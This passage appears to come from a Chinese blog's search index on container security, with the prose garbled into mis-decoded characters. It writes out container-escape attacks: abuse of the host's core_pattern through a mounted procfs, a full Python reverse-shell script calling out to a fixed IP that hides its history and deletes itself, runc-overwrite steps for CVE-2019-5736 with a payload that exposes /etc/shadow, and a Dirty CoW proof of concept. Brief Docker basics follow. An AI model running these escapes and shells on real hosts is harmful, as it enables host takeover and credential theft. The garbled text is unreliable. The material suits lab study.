æ”¯æŒåœ¨/proc/sys/kernel/core_patternä¸­ä½¿ç”¨æ–°è¯­æ³•ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„é¦–ä¸ªå­—ç¬¦æ˜¯ç®¡é“ç¬¦|ï¼Œé‚£ä¹ˆè¯¥è¡Œçš„å‰©ä½™å†…å®¹å°†è¢«å½“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæˆ–è„šæœ¬è§£é‡Šå¹¶æ‰§è¡Œã€‚ å› æ­¤ï¼Œå¯ä»¥åˆ©ç”¨ä¸Šè¿°æœºåˆ¶ï¼Œåœ¨æŒ‚è½½äº†å®¿ä¸»æœº procfs çš„å®¹å™¨å†…å®ç°é€ƒé€¸ã€‚ ç¯å¢ƒæ­å»ºï¼š ./metarget gadget install docker --version 18.03.1 ./metarget gadget install k8s --version 1.16.5 --domestic ./metarget cnv install mount-host-procfs æ‰§è¡Œå®Œæˆåï¼ŒK8s é›†ç¾¤å†… metarget å‘½ä»¤ç©ºé—´ä¸‹å°†ä¼šåˆ›å»ºä¸€ä¸ªåä¸º mount-host-procfs çš„ podã€‚ å®¿ä¸»æœºçš„ procfs åœ¨å®¹å™¨å†…éƒ¨çš„æŒ‚è½½è·¯å¾„æ˜¯ /host-procã€‚ å¤ç°ï¼š æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›å…¥å®¹å™¨ï¼š kubectl exec -it -n metarget mount-host-procfs /bin/bash åœ¨å®¹å™¨ä¸­ï¼Œé¦–å…ˆæ‹¿åˆ°å½“å‰å®¹å™¨åœ¨å®¿ä¸»æœºä¸Šçš„ç»å¯¹è·¯å¾„ï¼š cat /proc/mounts | grep docker ä» workdir å¯ä»¥å¾—åˆ°åŸºç¡€è·¯å¾„ï¼Œç»“åˆèƒŒæ™¯çŸ¥è¯†å¯çŸ¥å½“å‰å®¹å™¨åœ¨å®¿ä¸»æœºä¸Šçš„ merged ç›®å½•ç»å¯¹è·¯å¾„å¦‚ä¸‹ï¼š å‘å®¹å™¨å†… /host-proc/sys/kernel/core_pattern å†…å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š echo -e \"|/var/lib/docker/overlay2/c7c07b405792a4da3db07f22ae42a35ad00c8946362f0ebe7687bea79785add8/merged/tmp/.x.py \\rcore \" \u003e /host-proc/sys/kernel/core_pattern ç„¶ååœ¨å®¹å™¨å†…åˆ›å»ºä¸€ä¸ªåå¼¹ shell çš„ /tmp/.x.pyï¼š cat \u003e/tmp/.x.py \u003c\u003c EOF #!/usr/bin/python import os import pty import socket lhost = \"101.32.10.105\" lport = 9999 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\"HISTFILE\", '/dev/null') pty.spawn(\"/bin/bash\") os.remove('/tmp/.x.py') s.close() if __name__ == \"__main__\": main() EOF chmod +x /tmp/.x.py æœ€åï¼Œåœ¨å®¹å™¨å†…è¿è¡Œä¸€ä¸ªå¯ä»¥å´©æºƒçš„ç¨‹åºå³å¯ï¼Œä¾‹å¦‚ï¼š #include \u003cstdio.h\u003e int main(void) { int *a = NULL; *a = 1; return 0; } å®¹å™¨å†…è‹¥æ²¡æœ‰ç¼–è¯‘å™¨ï¼Œå¯ä»¥å…ˆåœ¨å…¶ä»–æœºå™¨ä¸Šç¼–è¯‘å¥½åæ”¾å…¥å®¹å™¨ä¸­ã€‚ å®Œæˆåï¼Œåœ¨å…¶ä»–æœºå™¨ä¸Šå¼€å¯ shell ç›‘å¬ï¼š ncat -lvnp 9999 æ¥ç€åœ¨å®¹å™¨å†…æ‰§è¡Œä¸Šè¿°ç¼–è¯‘å¥½çš„å´©æºƒç¨‹åºï¼Œå³å¯è·å¾—åå¼¹ shellã€‚ åˆ©ç”¨ CDK å·¥å…·ï¼š ./cdk run mount-procfs /mnt/host_proc \"touch /tmp/exp-success\" ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:2","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4 ç›¸å…³ç¨‹åºæ¼æ´å¯¼è‡´çš„å®¹å™¨é€ƒé€¸ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.1 CVE-2019-5736 å½±å“ç‰ˆæœ¬ï¼šDocker version \u003c= 18.09.2 \u0026 RunC version \u003c= 1.0-rc6 4.1.1 åŸç† CVE-2019-5736 ä¸€ä¸ªèƒ½å¤Ÿè¦†ç›–å®¿ä¸»æœº runc ç¨‹åºçš„å®¹å™¨é€ƒé€¸æ¼æ´ã€‚ åœ¨æ‰§è¡ŒåŠŸèƒ½ç±»ä¼¼äº docker exec ç­‰å‘½ä»¤æ—¶ï¼Œåº•å±‚å®é™…ä¸Šæ˜¯å®¹å™¨è¿è¡Œæ—¶åœ¨æ“ä½œã€‚ä¾‹å¦‚ runCï¼Œç›¸åº”åœ°ï¼Œrunc exec å‘½ä»¤ä¼šè¢«æ‰§è¡Œã€‚å®ƒçš„æœ€ç»ˆæ•ˆæœæ˜¯åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„ç¨‹åºã€‚è¿›ä¸€æ­¥è®²ï¼Œå°±æ˜¯åœ¨å®¹å™¨çš„å„ç§å‘½åç©ºé—´å†…ï¼Œå—åˆ°å„ç§é™åˆ¶ï¼ˆå¦‚ Cgroupsï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ã€‚é™¤æ­¤ä»¥å¤–ï¼Œè¿™ä¸ªæ“ä½œä¸åœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸ªç¨‹åºå¹¶æ— äºŒè‡´ã€‚ æ‰§è¡Œè¿‡ç¨‹å¤§ä½“å¦‚ä¸‹ï¼šrunC å¯åŠ¨å¹¶åŠ å…¥åˆ°å®¹å™¨çš„å‘½åç©ºé—´ï¼Œæ¥ç€ä»¥è‡ªèº« (/proc/self/ exeï¼‰ä¸ºèŒƒæœ¬å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹ï¼Œæœ€åé€šè¿‡ exec ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„äºŒè¿›åˆ¶ç¨‹åºã€‚ proc ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå³ /procã€‚å…³äºè¿™ä¸ªæ¦‚å¿µï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ proc ä¸‹çš„ä¸¤ç±»æ–‡ä»¶ï¼š /proc/[PID]/exeï¼šå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„ç¬¦å·é“¾æ¥ï¼Œåˆè¢«ç§°ä¸º magic linksï¼Œ æŒ‡å‘è¿›ç¨‹è‡ªèº« å¯¹åº”çš„æœ¬åœ°ç¨‹åºæ–‡ä»¶ï¼ˆä¾‹å¦‚æˆ‘ä»¬æ‰§è¡Œ ls /proc/[ls-PID]/exe å°±æŒ‡å‘ /bin/ls)ã€‚ /proc/[PID]/fd/ï¼šè¿™ä¸ªç›®å½•ä¸‹åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦ã€‚ /proc/[PID]/exe çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼Œå½“æ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œåœ¨æƒé™æ£€æŸ¥é€šè¿‡çš„æƒ…å†µä¸‹ï¼Œå†…æ ¸å°† ç›´æ¥è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥æ–‡ä»¶çš„æè¿°ç¬¦ï¼Œè€ŒéæŒ‰ç…§ä¼ ç»Ÿçš„æ‰“å¼€æ–¹å¼åšè·¯å¾„è§£æå’Œæ–‡ä»¶æŸ¥æ‰¾ã€‚è¿™æ · ä¸€æ¥ï¼Œå®ƒå®é™…ä¸Šç»•è¿‡äº† mnt å‘½åç©ºé—´åŠ chroot æœºåˆ¶å¯¹ä¸€ä¸ªè¿›ç¨‹èƒ½å¤Ÿè®¿é—®åˆ°çš„æ–‡ä»¶è·¯å¾„çš„é™åˆ¶ã€‚ é‚£ä¹ˆï¼Œè®¾æƒ³å¦‚ä¸‹æ”»å‡»åœºæ™¯ï¼šåœ¨ runc exec åŠ å…¥åˆ°å®¹å™¨çš„å‘½åç©ºé—´ä¹‹åï¼Œå®¹å™¨å†…è¿›ç¨‹å·²ç»èƒ½å¤Ÿ é€šè¿‡å†…éƒ¨ /proc è§‚å¯Ÿåˆ°å®ƒï¼Œæ­¤æ—¶å¦‚æœæ‰“å¼€ /proc/runc-[PID]/exe å¹¶å†™å…¥ä¸€äº›å†…å®¹ï¼Œå°±èƒ½å¤Ÿå®ç° å°†å®¿ä¸»æœºä¸Šçš„ runc äºŒè¿›åˆ¶ç¨‹åºè¦†ç›–æ‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸‹ä¸€æ¬¡ç”¨æˆ·è°ƒç”¨ runc æ¥æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå® é™…æ‰§è¡Œçš„å°†æ˜¯æ”»å‡»è€…æ”¾ç½®çš„æŒ‡ä»¤ã€‚ åœ¨å­˜åœ¨æ¼æ´çš„å®¹å™¨ç¯å¢ƒå†…ï¼Œä¸Šè¿°æ€è·¯æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æ”»å‡»è€…æƒ³è¦åœ¨å®¹å™¨å†…å®ç°å®¿ä¸»æœº ä¸Šçš„ä»£ç æ‰§è¡Œï¼ˆé€ƒé€¸)ï¼Œè¿˜éœ€è¦çªç ´ä¸¤ä¸ªé™åˆ¶ï¼š ç”¨æˆ·æƒé™é™åˆ¶ï¼Œéœ€è¦å…·æœ‰å®¹å™¨å†…éƒ¨ root æƒé™ã€‚ Linux ä¸å…è®¸ä¿®æ”¹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹å¯¹åº”çš„æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ äº‹å®ä¸Šï¼Œå¾ˆå¤šå®¹å™¨å°±æ˜¯ä»¥ root èº«ä»½å¯åŠ¨æœåŠ¡çš„ã€‚ æ”»å‡»æ­¥éª¤ï¼š å°†å®¹å™¨å†…çš„ /bin/sh ç¨‹åºè¦†ç›–ä¸º #!/proc/self/exeã€‚ æŒç»­éå†å®¹å™¨å†… /proc ç›®å½•ï¼Œè¯»å–æ¯ä¸€ä¸ª/proc/[PID]/cmdlineï¼Œå¯¹ runc åšå­—ç¬¦ä¸² åŒ¹é…ï¼Œç›´åˆ°æ‰¾åˆ° runc è¿›ç¨‹å·ã€‚ ä»¥åªè¯»æ–¹å¼æ‰“å¼€ /proc/[runc-PID]/exeï¼Œæ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦ fdã€‚ æŒç»­å°è¯•ä»¥å†™æ–¹å¼æ‰“å¼€ç¬¬ 3 æ­¥ä¸­è·å¾—çš„åªè¯» fd (/proc/self/fd/[fd])ï¼Œä¸€å¼€å§‹æ€»æ˜¯è¿”å›å¤±è´¥ï¼Œç›´åˆ° runc ç»“æŸå ç”¨åå†™æ–¹å¼æ‰“å¼€æˆåŠŸï¼Œç«‹å³é€šè¿‡è¯¥ fd å‘å®¿ä¸»æœºä¸Šçš„ /usr/bin/runcï¼Œ(åå­—ä¹Ÿå¯èƒ½æ˜¯ /usr/bin/docker/runcï¼‰å†™å…¥æ”»å‡»è½½è· runc æœ€åå°†æ‰§è¡Œç”¨æˆ·é€šè¿‡ docker exec æŒ‡å®šçš„ /bin/shï¼Œå®ƒçš„å†…å®¹åœ¨ç¬¬ 1 æ­¥ä¸­å·²ç»è¢«æ›¿æ¢æˆ #/proc/self/exeï¼Œå› æ­¤å®é™…ä¸Šå°†æ‰§è¡Œå®¿ä¸»æœºä¸Šçš„ runcï¼Œè€Œ runc ä¹Ÿå·²ç»åœ¨ç¬¬ 4 æ­¥ä¸­è¢«è¦†ç›–æ‰äº†ã€‚ 4.1.2 å¤ç° ./metarget cnv install cve-2019-5736 POCï¼š payload çš„å†…å®¹ï¼š var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:1","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5 å†…æ ¸æ¼æ´å¯¼è‡´çš„å®¹å™¨é€ƒé€¸ Linux å†…æ ¸æ¼æ´çš„å±å®³ä¹‹å¤§ã€å½±å“èŒƒå›´ä¹‹å¹¿ï¼Œä½¿å¾—å®ƒåœ¨å„ç§æ”»é˜²è¯é¢˜ä¸‹éƒ½å æ®éå¸¸é‡è¦çš„ä¸€å¸­ã€‚æ— è®ºæ”»é˜²åœºæ™¯æ€æ ·å˜åŒ–ï¼Œæˆ‘ä»¬å¯¹å†…æ ¸æ¼æ´çš„åˆ©ç”¨å¾€å¾€éƒ½æ˜¯ä»ç”¨æˆ·ç©ºé—´éæ³•è¿›å…¥å†…æ ¸ç©ºé—´å¼€å§‹ï¼Œåˆ°å†…æ ¸ç©ºé—´èµ‹äºˆå½“å‰æˆ–å…¶ä»–è¿›ç¨‹é«˜æƒé™åå›åˆ°ç”¨æˆ·ç©ºé—´ç»“æŸã€‚ ä»æ“ä½œç³»ç»Ÿå±‚é¢æ¥çœ‹ï¼Œå®¹å™¨è¿›ç¨‹åªæ˜¯ä¸€ç§å—åˆ°å„ç§å®‰å…¨æœºåˆ¶çº¦æŸçš„è¿›ç¨‹ï¼Œå› æ­¤ä»æ”»é˜²ä¸¤ç«¯æ¥çœ‹ï¼Œå®¹å™¨é€ƒé€¸éƒ½éµå¾ªä¼ ç»Ÿçš„æƒé™æå‡æµç¨‹ã€‚æ”»å‡»è€…å¯ä»¥å‡­å€Ÿæ­¤ç‰¹ç‚¹æ‹“å±•å®¹å™¨é€ƒé€¸çš„æ€è·¯ï¼Œä¸€æ—¦æœ‰æ–°çš„å†…æ ¸æ¼æ´äº§ç”Ÿï¼Œå°±å¯ä»¥è€ƒè™‘å®ƒæ˜¯å¦èƒ½å¤Ÿç”¨äºå®¹å™¨é€ƒé€¸ï¼›è€Œé˜²å®ˆè€…åˆ™èƒ½å¤Ÿé’ˆå¯¹æ­¤ç‰¹å¾è¿›è¡Œé˜²æŠ¤å’Œæ£€æµ‹ï¼Œå¦‚å®¿ä¸»æœºå†…æ ¸æ‰“è¡¥ä¸ï¼Œæˆ–æ£€æŸ¥è¯¥å†…æ ¸æ¼æ´åˆ©ç”¨æœ‰ä»€ä¹ˆç‰¹ç‚¹ã€‚ æˆ‘ä»¬çš„å…³æ³¨ç‚¹å¹¶éæ˜¯å†…æ ¸æ¼æ´ï¼Œåˆ—ä¸¾å¹¶å‰–æè¿‡å¤šå†…æ ¸æ¼æ´æ— ç›Šï¼Œä½†æˆ‘ä»¬å¯ä»¥æå‡ºå¦‚ä¸‹é—®é¢˜ï¼šä¸ºä½•å†…æ ¸æ¼æ´èƒ½å¤Ÿç”¨äºå®¹å™¨é€ƒé€¸ï¼Œåœ¨å…·ä½“å®æ–½è¿‡ç¨‹ä¸­ä¸å†…æ ¸æ¼æ´ç”¨äºä¼ ç»Ÿæƒé™æå‡æœ‰ä»€ä¹ˆä¸åŒï¼Œåœ¨æœ‰äº†å†…æ ¸æ¼æ´åˆ©ç”¨ä»£ç ä¹‹åè¿˜éœ€è¦åšå“ªäº›å·¥ä½œæ‰èƒ½å®ç°å®¹å™¨é€ƒé€¸ã€‚ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:5:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5.1 CVE-2016-5195 è¿‘å¹´æ¥ï¼ŒLinux ç³»ç»Ÿæ›å‡ºè¿‡æ— æ•°å†…æ ¸æ¼æ´ï¼Œå…¶ä¸­èƒ½å¤Ÿç”¨æ¥ææƒçš„ä¹Ÿä¸å°‘ï¼Œè„ç‰›ä¾èµ–äºå†…å­˜é¡µçš„å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼Œè¯¥æœºåˆ¶è‹±æ–‡åç§°ä¸º Copy-on-Writeï¼Œå†ç»“åˆå†…å­˜é¡µç‰¹æ€§ï¼Œå°†æ¼æ´å‘½åä¸ºDirty CoWï¼Œè¯‘ä¸ºè„ç‰›ï¼‰å¤§æ¦‚æ˜¯å…¶ä¸­æœ€æœ‰åæ°”çš„æ¼æ´ä¹‹ä¸€ã€‚æ¼æ´å‘ç°è€…ç”šè‡³ä¸ºå…¶ç”³è¯·äº†ä¸“å±åŸŸåï¼ˆdirtycow.ninjaï¼‰ï¼Œåœ¨ç¬”è€…çš„å°è±¡ä¸­ï¼Œä¸Šä¸€ä¸ªåŒæ ·ç”³è¯·äº†åŸŸåçš„ä¸¥é‡æ¼æ´è¿˜æ˜¯2014å¹´çš„å¿ƒè„æ»´è¡€ï¼ˆCVE-2014-0160ï¼Œheartbleed.comï¼‰ã€‚è‡ªè¿™ä¸¤ä¸ªæ¼æ´å¼€å§‹ï¼Œè¶Šæ¥è¶Šå¤šçš„ç ”ç©¶äººå‘˜å¼€å§‹ä¸ºä»–ä»¬å‘ç°çš„é«˜å±æ¼æ´ç”³è¯·åŸŸåï¼ˆå°½ç®¡ä¾ç„¶æ˜¯æå°‘æ•°ï¼‰ã€‚ å…³äºè„ç‰›æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« æ—©å·²éå¸ƒå…¨ç½‘ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¥è‡ª scumjr çš„ PoC æ¥å®Œæˆå®¹å™¨é€ƒé€¸ã€‚è¯¥åˆ©ç”¨çš„æ ¸å¿ƒæ€è·¯æ˜¯å‘ vDSO å†…å†™å…¥ shellcode å¹¶åŠ«æŒæ­£å¸¸å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ã€‚ å¤ç°ï¼š ./metarget cnv install cve-2016-5195 git clone https://github.com/gebl/dirtycow-docker-vdso.git cd dirtycow-docker-vdso/ docker-compose run dirtycow /bin/bash è¿›å…¥å®¹å™¨ï¼Œç¼–è¯‘ POCï¼š cd /dirtycow-vdso/ make ./0xdeadbeef 192.168.172.136:1234 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:5:1","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"å‚è€ƒ äº‘åŸç”Ÿå®‰å…¨â€”â€”æ”»é˜²å®è·µä¸ä½“ç³»æ„å»º ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:6:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Docker æ ¸å¿ƒæŠ€æœ¯","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Docker æ ¸å¿ƒæŠ€æœ¯ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 èƒŒæ™¯ Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€å¼€å‘ã€‚Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼Œæ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚ åŸºäº Linux å†…æ ¸çš„ Cgroupï¼ŒNamespaceï¼Œä»¥åŠ Union FS ç­‰æŠ€æœ¯ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œå°è£…éš”ç¦»ï¼Œå±äºæ“ä½œç³»ç»Ÿ å±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œç”±äºéš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºå®¿ä¸»å’Œå…¶å®ƒçš„éš”ç¦»çš„è¿›ç¨‹ï¼Œå› æ­¤ä¹Ÿç§°å…¶ä¸ºå®¹å™¨ã€‚ æœ€åˆå®ç°æ˜¯åŸºäº LXCï¼Œä» 0.7 ä»¥åå¼€å§‹å»é™¤ LXCï¼Œè½¬è€Œä½¿ç”¨è‡ªè¡Œå¼€å‘çš„ Libcontainerï¼Œä» 1.11 å¼€å§‹ï¼Œåˆ™ è¿›ä¸€æ­¥æ¼”è¿›ä¸ºä½¿ç”¨ runC å’Œ Containerdã€‚ Docker åœ¨å®¹å™¨çš„åŸºç¡€ä¸Šï¼Œè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼Œä»æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œäº’è”åˆ°è¿›ç¨‹éš”ç¦»ç­‰ç­‰ï¼Œæå¤§çš„ç®€åŒ–äº†å®¹å™¨çš„åˆ›å»ºå’Œç»´æŠ¤ï¼Œä½¿å¾— Docker æŠ€æœ¯æ¯”è™šæ‹ŸæœºæŠ€æœ¯æ›´ä¸ºè½»ä¾¿ã€å¿«æ·ã€‚ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.1 Docker ä¸è™šæ‹Ÿæœºçš„åŒºåˆ« Docker æœ‰ç€æ¯”è™šæ‹Ÿæœºæ›´å°‘çš„æŠ½è±¡å±‚ã€‚ç”±äº docker ä¸éœ€è¦ Hypervisor å®ç°ç¡¬ä»¶èµ„æºè™šæ‹ŸåŒ–ï¼Œè¿è¡Œåœ¨ docker å®¹å™¨ä¸Šçš„ç¨‹åºç›´æ¥ä½¿ç”¨çš„éƒ½æ˜¯å®é™…ç‰©ç†æœºçš„ç¡¬ä»¶èµ„æºã€‚å› æ­¤åœ¨ CPUã€å†…å­˜åˆ©ç”¨ç‡ä¸Š docker å°†ä¼šåœ¨æ•ˆç‡ä¸Šæœ‰ä¼˜åŠ¿ã€‚ Docker åˆ©ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸ï¼Œè€Œä¸éœ€è¦ Guest OSã€‚å› æ­¤ï¼Œå½“æ–°å»ºä¸€ä¸ªå®¹å™¨æ—¶ï¼Œdocker ä¸éœ€è¦å’Œè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚å¼•å¯¼ã€åŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯ä¸€ä¸ªæ¯”è¾ƒè´¹æ—¶è´¹èµ„æºçš„è¿‡ç¨‹ï¼Œå½“æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºæ—¶ï¼Œè™šæ‹Ÿæœºè½¯ä»¶éœ€è¦åŠ è½½ Guest OSï¼Œè¿™ä¸ªæ–°å»ºè¿‡ç¨‹æ˜¯åˆ†é’Ÿçº§åˆ«çš„ã€‚è€Œ docker ç”±äºç›´æ¥åˆ©ç”¨å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œåˆ™çœç•¥äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œå› æ­¤æ–°å»ºä¸€ä¸ª docker å®¹å™¨åªéœ€è¦å‡ ç§’é’Ÿã€‚å¦å¤–ï¼Œç°ä»£æ“ä½œç³»ç»Ÿæ˜¯å¤æ‚çš„ç³»ç»Ÿï¼Œåœ¨ä¸€å°ç‰©ç†æœºä¸Šæ–°å¢åŠ ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„èµ„æºå¼€é”€æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œå› æ­¤ï¼Œdocker å¯¹æ¯”è™šæ‹Ÿæœºåœ¨èµ„æºæ¶ˆè€—ä¸Šä¹Ÿå æœ‰æ¯”è¾ƒå¤§çš„ä¼˜åŠ¿ã€‚äº‹å®ä¸Šï¼Œåœ¨ä¸€å°ç‰©ç†æœºä¸Šæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“å»ºç«‹æˆç™¾ä¸Šåƒçš„å®¹å™¨ï¼Œè€Œåªèƒ½å»ºç«‹å‡ ä¸ªè™šæ‹Ÿæœºã€‚ æ€§èƒ½å¯¹æ¯” å®¹å™¨ä¸»è¦ç‰¹æ€§ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.2 å®¹å™¨æ“ä½œ å¯åŠ¨ï¼šdocker run -it äº¤äº’ -d åå°è¿è¡Œ -p ç«¯å£æ˜ å°„ -v ç£ç›˜æŒ‚è½½ å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨ docker start åœæ­¢å®¹å™¨ docker stop æŸ¥çœ‹å®¹å™¨è¿›ç¨‹ docker ps æŸ¥çœ‹å®¹å™¨ç»†èŠ‚ docker inspect [containerid] è¿›å…¥å®¹å™¨ docker attach PID=$(docker inspect --format \"{{ .State.Pid }}\" [container]) nsenter --target $PID --mount --uts --ipc --net --pid ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.3 Dockerfile cat Dockerfile FROM ubuntu ENV MY_SERVICE_PORT=80 ADD bin/amd64/httpserver /httpserver ENTRYPOINT /httpserver å°† Dockerfile æ‰“åŒ…æˆé•œåƒ docker build -t cncamp/httpserver:${tag} . docker push geekby/httpserver:v1.0 è¿è¡Œå®¹å™¨ docker run -d geekby/httpserver:v1.0 ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:3","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.4 Docker å¼•æ“æ¶æ„ 